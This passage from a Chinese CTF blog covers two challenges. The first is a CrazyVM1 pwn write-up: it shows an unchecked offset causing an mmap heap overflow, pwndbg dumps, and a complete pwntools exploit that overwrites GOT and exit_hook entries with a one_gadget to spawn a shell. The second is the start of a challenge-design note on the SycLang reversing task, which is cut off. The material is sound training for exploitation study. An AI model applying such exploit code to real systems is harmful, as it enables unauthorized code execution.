class="line">  <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5u</span>:</span><br></pre></td></tr></table></figure>
<ul>
<li>想要绕过这个限制就必须让 op1 为“5”，导致多数指令没法正常执行</li>
</ul>
<p>在程序的第 0x12 和 0x13 号指令中还有另一处漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;temp_base -= <span class="number">8LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( offset &lt;= <span class="number">0xF</span> )</span><br><span class="line">  *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base] = ptr-&gt;buf[offset];<span class="comment">// 0x80000-8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base] = ptr-&gt;temp_base;</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 0x12 可以将任意数据存储到 <code>ptr-&gt;node_temp-&gt;chunk</code> 指向的堆空间中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptr-&gt;temp_base += <span class="number">8LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( offset &lt;= <span class="number">0xF</span> )</span><br><span class="line">  ptr-&gt;buf[offset] = *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - <span class="number">8</span>];<span class="comment">// 0x80000-8</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ptr-&gt;temp_base = *(_QWORD *)&amp;ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - <span class="number">8</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 0x13 可以将 <code>ptr-&gt;node_temp-&gt;chunk</code> 中的数据取出，并且可以控制 <code>ptr-&gt;temp_base</code></li>
</ul>
<p>关键点就在于 <code>ptr-&gt;temp_base</code> 是可控的，并且程序没有对 <code>ptr-&gt;temp_base</code> 的范围进行检查，这就导致了 mmap 的堆空间发生溢出</p>
<p><strong>入侵思路</strong></p>
<p>由于 mmap 的堆空间发生溢出，我们就有机会劫持 free_hook</p>
<p>利用下面的脚本可以将 libc-calloc 提取出来，并且导致 <code>ptr-&gt;node_temp-&gt;chunk[ptr-&gt;temp_base - ptr-&gt;node_temp-&gt;base - 8]</code> 索引到 libc-GOT：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code =  intemp(<span class="number">0x10</span>) </span><br><span class="line">code += outtemp(<span class="number">0</span>)</span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323020</span>+<span class="number">8</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code += intemp(<span class="number">0</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += outtemp(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x559f7a2bb2a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x559f7a2bb2a0</span> ◂— <span class="number">0x7f00000000323020</span> <span class="comment">/* &#x27; 02&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x559f7a2bb2a8</span> ◂— <span class="number">0x2a3028</span> <span class="comment">/* &#x27;(0*&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x559f7a2bb2b0</span> —▸ <span class="number">0x7f7d06f06c90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x559f7a2bb2b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>再加上下面脚本就可以成功劫持 libc-GOT（calloc）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code += mov(<span class="number">1</span>,<span class="number">0xe6aee</span><span class="number">-0x9ec90</span>)</span><br><span class="line">code += add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">code += intemp(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>劫持前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f068029e018</span> (_dl_catch_exception@got.plt) —▸ <span class="number">0x7f06801df6a0</span> (_dl_catch_exception) ◂— endbr64 </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f068029e020</span> (<span class="built_in">malloc</span>@got.plt) —▸ <span class="number">0x7f0680119260</span> (<span class="built_in">malloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f068029e028</span> (_dl_signal_exception@got.plt) —▸ <span class="number">0x7f06801df5f0</span> (_dl_signal_exception) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7f068029e030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f068011ac90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7f068029e038</span> (<span class="built_in">realloc</span>@got.plt) —▸ <span class="number">0x7f068011a000</span> (<span class="built_in">realloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7f068029e040</span> (_dl_signal_error@got.plt) —▸ <span class="number">0x7f06801df640</span> (_dl_signal_error) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f068029e048</span> (_dl_catch_error@got.plt) —▸ <span class="number">0x7f06801df7c0</span> (_dl_catch_error) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>劫持后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rcx <span class="number">0x7f068029e030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f0680162aee</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
<p>不过 calloc-GOT 显然无法触发，因此我们需要重新计算一下偏移去劫持 exit_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f0afda13010</span>+<span class="number">0x323020</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0afdd36030</span> (<span class="built_in">calloc</span>@got.plt) —▸ <span class="number">0x7f0afdbb2c90</span> (<span class="built_in">calloc</span>) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f0afdd36038</span> (<span class="built_in">realloc</span>@got.plt) —▸ <span class="number">0x7f0afdbb2000</span> (<span class="built_in">realloc</span>) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">3</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7fa350ad8150</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7fa350ad8150</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>P\x81\xadP\xa3\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">ld<span class="number">-2.31</span>.so      <span class="number">0x7fa350b05f68</span> <span class="number">0x7fa350ad8150</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x7fa3507e2010</span> <span class="number">0x7fa350b05f68</span></span><br><span class="line"><span class="number">0x7fa3507e2010</span>-&gt;<span class="number">0x7fa350b05f68</span> is <span class="number">0x323f58</span> bytes (<span class="number">0x647eb</span> words)</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CrazyVM1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xB58C)\n&quot;</span>) <span class="comment">#0xD792</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op</span>(<span class="params">op,rsi,rdx,rcx,r8</span>):</span></span><br><span class="line">    <span class="keyword">return</span> p8(op)+p8(rsi)+p8(rdx)+p8(rcx)+p32(r8)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span>(<span class="params">offset,data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,offset,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intemp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">0x12</span>,<span class="number">4</span>,<span class="number">3</span>,offset,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outtemp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">0x13</span>,<span class="number">4</span>,<span class="number">3</span>,offset,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">offset,data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> op(<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,offset,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code =  intemp(<span class="number">0x10</span>) </span><br><span class="line">code += outtemp(<span class="number">0</span>)</span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323020</span>+<span class="number">8</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code += intemp(<span class="number">1</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += outtemp(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0xe6aee</span>-<span class="number">0x9ec90</span>)</span><br><span class="line">code += add(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">code += mov(<span class="number">1</span>,<span class="number">0x323f58</span>+<span class="number">0x10</span>-<span class="number">0x80000</span>)</span><br><span class="line">code += add(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code += intemp(<span class="number">1</span>)</span><br><span class="line">code += outtemp(<span class="number">0x10</span>)</span><br><span class="line">code += intemp(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">data =  <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;input code for vm: &quot;</span>,code)</span><br><span class="line">sa(<span class="string">&quot;input data for vm: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">SycLang出题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-21 10:13:16 / Modified: 10:16:56" itemprop="dateCreated datePublished" datetime="2023-06-21T10:13:16+08:00">2023-06-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SycLang 出题思路</strong></p>
<p>本题目提供了中间代码和编译器前端，要求将中间代码逆向回C，自行编译后解出 flag（当然也可以直接通过中间代码分析 flag）</p>
<p>首先，本程序有3个陷阱：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var12&lt;+32&gt; := var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;</span><br><span class="line">  temp84 := #1</span><br><span class="line">  temp85 := var15&lt;+56&gt; + temp84</span><br><span class="line">  var18&lt;+80&gt; := temp85</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var13&lt;+40&gt; := var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;</span><br><span class="line">  temp86 := #0</span><br><span class="line">  var13&lt;+40&gt; := temp86</span><br><span class="line">  temp87 := var12&lt;+32&gt; ^ var13&lt;+40&gt;</span><br><span class="line">  var14&lt;+48&gt; := temp87</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt; := var14&lt;+48&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>var13&lt;+40&gt;</code> 在异或前会赋值“0”，因此对 <code>e1.key(var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;&lt;+tempa&gt;)</code> 的异或加密失效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">LABEL label59 :</span><br><span class="line">  temp89 := #0</span><br><span class="line">  var24(@exp.L[0])&lt;+200&gt;&lt;+1256&gt; := temp89</span><br><span class="line">  temp91 := #12</span><br><span class="line">  var24(@exp.R[0])&lt;+264&gt;&lt;+1256&gt; := temp91</span><br><span class="line">  temp93 := #0</span><br><span class="line">  </span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">  var24(@exp.key[23])&lt;+192&gt;&lt;+1256&gt; := temp195</span><br><span class="line">  temp196 := #23</span><br><span class="line">  var15&lt;+56&gt; := temp196</span><br><span class="line">LABEL label118 :</span><br><span class="line">  temp198 := #0</span><br><span class="line">  IF var15&lt;+56&gt; &gt; temp198 GOTO label117</span><br><span class="line">  GOTO label116</span><br><span class="line">LABEL label117 :</span><br><span class="line">  var18&lt;+80&gt; := var15&lt;+56&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp199 := #1</span><br><span class="line">  temp200 := var15&lt;+56&gt; - temp199</span><br><span class="line">  var16&lt;+64&gt; := temp200</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  temp201 := var19&lt;+88&gt; - var17&lt;+72&gt;</span><br><span class="line">  var21&lt;+104&gt; := temp201</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var21&lt;+104&gt;</span><br><span class="line">  temp197 := #1</span><br><span class="line">  var15&lt;+56&gt; := var15&lt;+56&gt; - temp197</span><br><span class="line">  GOTO label118</span><br><span class="line">LABEL label116 :</span><br><span class="line">  temp202 := #0</span><br><span class="line">  var15&lt;+56&gt; := temp202</span><br><span class="line">LABEL label126 :</span><br><span class="line">  temp204 := #8</span><br><span class="line">  IF var15&lt;+56&gt; &lt; temp204 GOTO label125</span><br><span class="line">  GOTO label124</span><br><span class="line">LABEL label125 :</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var16&lt;+64&gt; := var24(@exp.L[0])&lt;+200&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var18&lt;+80&gt; := var24(@exp.R[0])&lt;+264&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var15&lt;+56&gt;&#125;</span><br><span class="line">  var20&lt;+96&gt; := var24(@exp.X[0])&lt;+328&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var17&lt;+72&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var19&lt;+88&gt; := var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt;</span><br><span class="line">  var17&lt;+72&gt; := var17&lt;+72&gt; + var20&lt;+96&gt;</span><br><span class="line">  var19&lt;+88&gt; := var19&lt;+88&gt; - var20&lt;+96&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var16&lt;+64&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := var17&lt;+72&gt;</span><br><span class="line">#!tempa := &#123;#8&#125;*&#123;var18&lt;+80&gt;&#125;</span><br><span class="line">  var24(@exp.key[0])&lt;+8&gt;&lt;+1256&gt;&lt;+tempa&gt; := 